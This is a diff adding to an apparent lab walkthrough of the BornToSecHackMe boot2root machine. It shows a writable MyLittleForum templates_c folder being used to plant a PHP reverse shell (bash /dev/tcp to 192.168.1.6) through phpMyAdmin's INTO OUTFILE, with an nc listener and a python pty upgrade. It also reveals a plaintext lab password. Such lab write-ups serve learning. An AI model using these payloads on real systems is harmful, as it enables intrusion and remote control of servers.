@@ -187,6 +187,98 @@ so for that we search in that forum name [mylitlleforum](https://github.com/My-L
 in that instalition method that :
 Depending on your server configuration the write permission of the subdirectory templates_c (CHMOD 770, 775 or 777) and the file config/db_settings.php (CHMOD 666) might need to be changed in order that they are writable by the script
 
-the subdirectory templates_c have persmission of 777 and listabel(autoindex on) in the borwser so we can easy put the file there and run it.
+the subdirectory templates_c have persmission of 777 and listabel(autoindex on) in the borwser so we can easy put the file there and run it because ```mylitlleforum``` php based.
+
+now we can easly [create php uploader ](https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f) or [webshell](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985) but in our case we choose a reversehll with php:
+
+```
+<?php
+exec("bash -c 'bash -i >& /dev/tcp/192.168.1.6/9999 0>&1'");
+?>
+```
+
+<?php: This marks the start of the PHP script.
+exec(): The exec() function is used to execute an external program or command in PHP.
+bash -c: The -c flag tells Bash to execute the given command string as a complete script 
+bash -i >& /dev/tcp/192.168.1.6/9999 0>&1:
+- -i: This flag tells Bash to run interactively, enabling input/output interaction with the shell
+```>& /dev/tcp/192.168.1.6/9999```:
+ - The >& redirects both standard output (stdout) and standard error (stderr) to a file or device.
+ - /dev/tcp/192.168.1.6/9999 is a special device file in Bash, which opens a TCP connection to the given IP address and port (192.168.1.6 on port 9999). When used, Bash communicates over this connection.
+
+note : /dev/tcp/ is not a real file or directory in the filesystem. Instead, it is a special construct or feature provided by certain shells that allows scripts to send and receive data over TCP or UDP connections
+
+
+so to upload our revershell with phpmyadmin that we have found and with subdirectory templates_c:
+
+<?php
+exec("bash -c 'bash -i >& /dev/tcp/attacker_ip/port 0>&1'");
+?>
+
+turn to :
+
+SELECT "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/192.168.1.6/2020 0>&1\"');?>" INTO OUTFILE '/var/www/forum/templates_c/ok4.php'
+
+---- image of subdirectory database script --- 
+
+
+----- image of file uploded -----
+
+
+and we can found the shell.php in https://192.168.1.5/forum/templates_c/ then we can just navigate to https://192.168.1.5/forum/templates_c/ok4.php
+
+and befor that we start a listiner in attacker machine with nc so will listen to nc -lvnp 2020
+
+and now we resive reverseshell 
+
+---image reversehll ----
+
+
+now we going to home to users that we can access or we can found something :
+
+------ images --- 
+
+
+we can see that our user www-data can access to folder LOOCKATME
+
+in that user/folder  :
+www-data@BornToSecHackMe:/home/LOOKATME$ ls -la
+ls -la
+total 1
+drwxr-x--- 2 www-data www-data  31 Oct  8  2015 .
+drwxrwx--x 9 www-data root     126 Oct 13  2015 ..
+-rwxr-x--- 1 www-data www-data  25 Oct  8  2015 password
+
+if we cat passowrd :
+www-data@BornToSecHackMe:/home/LOOKATME$ cat password
+cat password
+lmezard:G!@M6f4Eatau{sF"
+www-data@BornToSecHackMe:/home/LOOKATME$ 
+
+
+we that have a passoword of lmezard, we try ssh but not working so let just use su , The su command in Linux lets you switch to another user's account or execute commands as a different user
+
+but we have a problem that we dont have aterminal or tty/vertual terminal because we just create a shell with tcp connection, 
+
+----- image problem tty -----
+
+to resolve that problem we need we need pseudo-TTY To enhance your reverse shell with full terminal capabilities, we can achive that by python ,
+after we check version of python, we found in that machine there a  Python 2.7.3 (default, Jun 22 2015, 19:43:34), so we can achive that by library in python pty
+the full command :
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+--- image tty ---
+
+now let change to user su lmezard, in home we found challenge :
+mezard@BornToSecHackMe:~$ ls
+ls
+fun  README
+lmezard@BornToSecHackMe:~$ pwd
+pwd
+/home/lmezard
+cat README 
+Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+
+
 
 
